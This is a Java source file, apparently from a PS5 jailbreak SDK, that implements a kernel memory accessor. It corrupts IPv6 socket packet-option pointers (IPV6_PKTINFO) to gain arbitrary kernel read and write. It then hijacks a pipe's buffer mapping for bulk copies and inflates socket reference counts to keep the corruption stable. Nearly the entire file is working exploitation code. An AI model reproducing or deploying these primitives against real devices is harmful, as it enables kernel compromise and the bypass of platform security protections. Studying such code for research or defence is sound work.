package org.ps5jb.sdk.core.kernel;

import java.io.IOException;
import java.io.ObjectInputStream;
import org.ps5jb.sdk.core.SdkRuntimeException;
import org.ps5jb.sdk.res.ErrorMessages;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.include.UniStd;
import org.ps5jb.sdk.include.netinet6.in6.OptionIPv6;
import org.ps5jb.sdk.include.inet.in.ProtocolType;
import org.ps5jb.sdk.include.sys.socket.SocketType;
import org.ps5jb.sdk.include.sys.socket.AddressFamilyType;
import org.ps5jb.sdk.include.sys.Socket;
import org.ps5jb.sdk.include.sys.ErrNo;
import org.ps5jb.sdk.lib.LibKernel;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.loader.KernelAccessor;

public class KernelAccessorIPv6 implements KernelAccessor
{
    private static final long serialVersionUID = 8937512308105266960L;
    private Pointer master_target_buffer;
    private Pointer slave_buffer;
    private Pointer pipemap_buffer;
    private Pointer krw_buffer;
    private int master_sock;
    private int victim_sock;
    private transient LibKernel libKernel;
    private transient ErrNo errNo;
    private transient Socket socket;
    private int[] pipe_fd;
    private KernelPointer pipe_addr;
    private KernelPointer kernelBase;
    
    public KernelAccessorIPv6(final KernelPointer ofilesAddress, final KernelPointer kernelBase) throws SdkException {
        this.libKernel = new LibKernel();
        this.errNo = new ErrNo(this.libKernel);
        this.socket = new Socket(this.libKernel);
        this.kernelBase = kernelBase;
        final long sock_opt_size = 20L;
        this.master_target_buffer = Pointer.calloc(20L);
        this.slave_buffer = Pointer.calloc(20L);
        this.pipemap_buffer = Pointer.calloc(20L);
        this.krw_buffer = Pointer.calloc(16384L);
        this.master_sock = this.socket.createSocket(AddressFamilyType.AF_INET6, SocketType.SOCK_DGRAM, ProtocolType.IPPROTO_UDP);
        this.victim_sock = this.socket.createSocket(AddressFamilyType.AF_INET6, SocketType.SOCK_DGRAM, ProtocolType.IPPROTO_UDP);
        this.socket.setSocketOptionsIPv6(this.master_sock, OptionIPv6.IPV6_PKTINFO, this.master_target_buffer);
        this.socket.setSocketOptionsIPv6(this.victim_sock, OptionIPv6.IPV6_PKTINFO, this.slave_buffer);
        final KernelPointer master_sock_filedescent_addr = ofilesAddress.inc(this.master_sock * 48L);
        final KernelPointer victim_sock_filedescent_addr = ofilesAddress.inc(this.victim_sock * 48L);
        final KernelPointer master_sock_file_addr = KernelPointer.valueOf(master_sock_filedescent_addr.read8());
        final KernelPointer victim_sock_file_addr = KernelPointer.valueOf(victim_sock_filedescent_addr.read8());
        final KernelPointer master_sock_socket_addr = KernelPointer.valueOf(master_sock_file_addr.read8());
        final KernelPointer victim_sock_socket_addr = KernelPointer.valueOf(victim_sock_file_addr.read8());
        final KernelPointer master_pcb = KernelPointer.valueOf(master_sock_socket_addr.read8(24L));
        final KernelPointer slave_pcb = KernelPointer.valueOf(victim_sock_socket_addr.read8(24L));
        final KernelPointer master_pktopts = KernelPointer.valueOf(master_pcb.read8(288L));
        final KernelPointer slave_pktopts = KernelPointer.valueOf(slave_pcb.read8(288L));
        master_pktopts.write8(16L, slave_pktopts.inc(16L).addr());
        final UniStd uniStd = new UniStd(this.libKernel);
        this.pipe_fd = uniStd.pipe();
        final int pipe_read = this.pipe_fd[0];
        final KernelPointer pipe_filedescent = ofilesAddress.inc(pipe_read * 48L);
        final KernelPointer pipe_file = KernelPointer.valueOf(this.ipv6_kread8(pipe_filedescent));
        this.pipe_addr = KernelPointer.valueOf(this.ipv6_kread8(pipe_file));
        this.inc_socket_refcount(this.master_sock, ofilesAddress);
        this.inc_socket_refcount(this.victim_sock, ofilesAddress);
    }
    
    public int getMasterSock() {
        return this.master_sock;
    }
    
    public int getVictimSock() {
        return this.victim_sock;
    }
    
    public synchronized void free() {
        if (this.master_target_buffer != null) {
            this.master_target_buffer.free();
        }
        if (this.slave_buffer != null) {
            this.slave_buffer.free();
        }
        if (this.pipemap_buffer != null) {
            this.pipemap_buffer.free();
        }
        if (this.krw_buffer != null) {
            this.krw_buffer.free();
        }
        if (this.pipe_fd[0] != -1) {
            this.libKernel.close(this.pipe_fd[0]);
        }
        if (this.pipe_fd[1] != -1) {
            this.libKernel.close(this.pipe_fd[1]);
        }
        this.libKernel.closeLibrary();
    }
    
    private void write_to_victim(final KernelPointer kernelAddress) throws SdkException {
        this.master_target_buffer.write8(0L, kernelAddress.addr());
        this.master_target_buffer.write8(8L, 0L);
        this.master_target_buffer.write4(16L, 0);
        this.socket.setSocketOptionsIPv6(this.master_sock, OptionIPv6.IPV6_PKTINFO, this.master_target_buffer);
    }
    
    private void ipv6_kread(final KernelPointer kernelAddress, final Pointer buffer) throws SdkException {
        this.write_to_victim(kernelAddress);
        this.socket.getSocketOptionsIPv6(this.victim_sock, OptionIPv6.IPV6_PKTINFO, buffer);
    }
    
    private void ipv6_kwrite(final KernelPointer kernelAddress, final Pointer buffer) throws SdkException {
        this.write_to_victim(kernelAddress);
        this.socket.setSocketOptionsIPv6(this.victim_sock, OptionIPv6.IPV6_PKTINFO, buffer);
    }
    
    private long ipv6_kread8(final KernelPointer kernelAddress) throws SdkException {
        this.ipv6_kread(kernelAddress, this.slave_buffer);
        return this.slave_buffer.read8();
    }
    
    private synchronized void copyout(final long src, final Pointer dest, final long length) throws SdkException {
        final long value0 = 4611686019501129728L;
        final long value2 = 4611686018427387904L;
        this.pipemap_buffer.write8(4611686019501129728L);
        this.pipemap_buffer.write8(8L, 4611686018427387904L);
        this.pipemap_buffer.write4(16L, 0);
        this.ipv6_kwrite(this.pipe_addr, this.pipemap_buffer);
        this.pipemap_buffer.write8(src);
        this.pipemap_buffer.write8(8L, 0L);
        this.pipemap_buffer.write4(16L, 0);
        this.ipv6_kwrite(this.pipe_addr.inc(16L), this.pipemap_buffer);
        final long readCount = this.libKernel.read(this.pipe_fd[0], dest, length);
        if (readCount == length) {
            return;
        }
        if (readCount == -1L) {
            throw this.errNo.getLastException(this.getClass(), "copyout", new Object[0]);
        }
        throw new SdkException(ErrorMessages.getClassErrorMessage(this.getClass(), "copyout.count", new Long(readCount), new Long(length), new Long(src)));
    }
    
    private synchronized void copyin(final Pointer src, final long dest, final long length) throws SdkException {
        final long value = 4611686018427387904L;
        this.pipemap_buffer.write8(0L);
        this.pipemap_buffer.write8(8L, 4611686018427387904L);
        this.pipemap_buffer.write4(16L, 0);
        this.ipv6_kwrite(this.pipe_addr, this.pipemap_buffer);
        this.pipemap_buffer.write8(dest);
        this.pipemap_buffer.write8(8L, 0L);
        this.pipemap_buffer.write4(16L, 0);
        this.ipv6_kwrite(this.pipe_addr.inc(16L), this.pipemap_buffer);
        final long writeCount = this.libKernel.write(this.pipe_fd[1], src, length);
        if (writeCount == length) {
            return;
        }
        if (writeCount == -1L) {
            throw this.errNo.getLastException(this.getClass(), "copyin", new Object[0]);
        }
        throw new SdkException(ErrorMessages.getClassErrorMessage(this.getClass(), "copyin.count", new Long(writeCount), new Long(length), new Long(dest)));
    }
    
    private void inc_socket_refcount(final int target_fd, final KernelPointer ofilesAddress) {
        final KernelPointer filedescent_addr = ofilesAddress.inc(target_fd * 48L);
        final KernelPointer file_addr = KernelPointer.valueOf(filedescent_addr.read8(0L));
        final KernelPointer file_data_addr = KernelPointer.valueOf(file_addr.read8(0L));
        file_data_addr.write4(256);
    }
    
    public byte read1(final long kernelAddress) {
        try {
            this.copyout(kernelAddress, this.krw_buffer, 1L);
            return this.krw_buffer.read1();
        }
        catch (final SdkException e) {
            throw new SdkRuntimeException((Throwable)e);
        }
    }
    
    public short read2(final long kernelAddress) {
        try {
            this.copyout(kernelAddress, this.krw_buffer, 2L);
            return this.krw_buffer.read2();
        }
        catch (final SdkException e) {
            throw new SdkRuntimeException((Throwable)e);
        }
    }
    
    public int read4(final long kernelAddress) {
        try {
            this.copyout(kernelAddress, this.krw_buffer, 4L);
            return this.krw_buffer.read4();
        }
        catch (final SdkException e) {
            throw new SdkRuntimeException((Throwable)e);
        }
    }
    
    public long read8(final long kernelAddress) {
        try {
            this.copyout(kernelAddress, this.krw_buffer, 8L);
            return this.krw_buffer.read8();
        }
        catch (final SdkException e) {
            throw new SdkRuntimeException((Throwable)e);
        }
    }
    
    public void read(final long kernelAddress, final byte[] buffer, final int offset, final int length) {
        if (buffer.length - offset < length) {
            throw new IndexOutOfBoundsException();
        }
        int srcOffset = 0;
        int targetOffset = offset;
        while (srcOffset < length) {
            int readSize = 16384;
            if (srcOffset + readSize > length) {
                readSize = length - srcOffset;
            }
            try {
                this.copyout(kernelAddress + srcOffset, this.krw_buffer, readSize);
                this.krw_buffer.read(0L, buffer, targetOffset, readSize);
                srcOffset += readSize;
                targetOffset += readSize;
            }
            catch (final SdkException e) {
                throw new SdkRuntimeException((Throwable)e);
            }
        }
    }
    
    public void write1(final long kernelAddress, final byte value) {
        try {
            this.krw_buffer.write1(value);
            this.copyin(this.krw_buffer, kernelAddress, 1L);
        }
        catch (final SdkException e) {
            throw new SdkRuntimeException((Throwable)e);
        }
    }
    
    public void write2(final long kernelAddress, final short value) {
        try {
            this.krw_buffer.write2(value);
            this.copyin(this.krw_buffer, kernelAddress, 2L);
        }
        catch (final SdkException e) {
            throw new SdkRuntimeException((Throwable)e);
        }
    }
    
    public void write4(final long kernelAddress, final int value) {
        try {
            this.krw_buffer.write4(value);
            this.copyin(this.krw_buffer, kernelAddress, 4L);
        }
        catch (final SdkException e) {
            throw new SdkRuntimeException((Throwable)e);
        }
    }
    
    public void write8(final long kernelAddress, final long value) {
        try {
            this.krw_buffer.write8(value);
            this.copyin(this.krw_buffer, kernelAddress, 8L);
        }
        catch (final SdkException e) {
            throw new SdkRuntimeException((Throwable)e);
        }
    }
    
    public void write(final long kernelAddress, final byte[] buffer, final int offset, final int length) {
        if (buffer.length - offset < length) {
            throw new IndexOutOfBoundsException();
        }
        int srcOffset = offset;
        int targetOffset = 0;
        while (targetOffset < length) {
            int writeSize = 16384;
            if (targetOffset + writeSize > length) {
                writeSize = length - targetOffset;
            }
            try {
                this.krw_buffer.write(0L, buffer, srcOffset, writeSize);
                this.copyin(this.krw_buffer, kernelAddress + targetOffset, writeSize);
                srcOffset += writeSize;
                targetOffset += writeSize;
            }
            catch (final SdkException e) {
                throw new SdkRuntimeException((Throwable)e);
            }
        }
    }
    
    public long getKernelBase() {
        return (this.kernelBase == null) ? 0L : this.kernelBase.addr();
    }
    
    private void readObject(final ObjectInputStream stream) throws IOException, ClassNotFoundException {
        stream.defaultReadObject();
        this.libKernel = new LibKernel();
        this.errNo = new ErrNo(this.libKernel);
        this.socket = new Socket(this.libKernel);
    }
}
